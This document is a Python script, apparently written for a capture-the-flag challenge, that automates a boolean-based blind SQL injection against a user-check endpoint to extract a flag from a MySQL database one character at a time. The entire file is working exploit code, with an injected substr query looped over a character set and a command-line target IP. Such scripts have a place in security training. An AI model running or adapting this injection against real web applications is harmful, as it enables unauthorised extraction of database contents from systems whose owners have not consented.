#!/usr/bin/env python3

#This script dumps the flag from a MySQL database via boolean-based blind SQL injection

import requests
import string
import argparse

parser = argparse.ArgumentParser(description='Flag 3 Auto-Pwn')
parser.add_argument('-i', help='Target IP Address (Eg: 10.10.10.10)', required=True)
args = parser.parse_args()

IP = args.i

def exploit():
	url = "http://" + IP + "/register/user-check?username=admin"
	
	#Create a number and letter list
	num = list(range(10))
	string_ints = [str(int) for int in num]
	characters = list(string.ascii_uppercase) + list('{') + list('}') + list(':') + string_ints

	counter = 1
	flag = list("")
	
	#Brute-Force Flag
	while True:
		for i in characters:
			injection = "' and (substr((SELECT flag FROM flag LIMIT 0,1)," + str(counter) + ",1)) = '" + i + "';-- -"
			r = requests.get(url + injection) 
			print(f"Trying: {''.join(flag) + i}")
			if "false" in r.text:
				flag += i
				counter += 1
				print(f"Found: {''.join(flag)}")
				if "}" in flag:
					print("NICE")
					return False

exploit()